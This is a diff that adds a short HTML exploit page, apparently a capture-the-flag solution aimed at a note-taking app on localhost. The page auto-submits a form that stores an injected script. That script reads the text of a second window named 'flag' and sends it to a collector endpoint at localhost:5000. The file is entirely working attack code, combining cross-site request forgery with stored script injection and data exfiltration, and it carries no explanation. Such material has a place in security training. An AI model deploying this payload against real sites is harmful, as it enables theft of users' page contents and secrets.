@@ -1,0 +1,13 @@
+<form action="http://localhost:3001/edit" method="POST" target="note">
+    <textarea name="content">
+<script>
+const flag = window.open("", "flag").document.querySelectorAll(".container")[1].innerText;
+window.open(`http://localhost:5000/flag?${flag}`);
+</script>
+    </textarea>
+</form>
+<script>
+    window.open("http://localhost:3001", "flag");
+    document.querySelector("form").submit();
+</script>
+<img src="http://localhost:5000/wait" onerror="window.location.href='http://localhost:3001'">
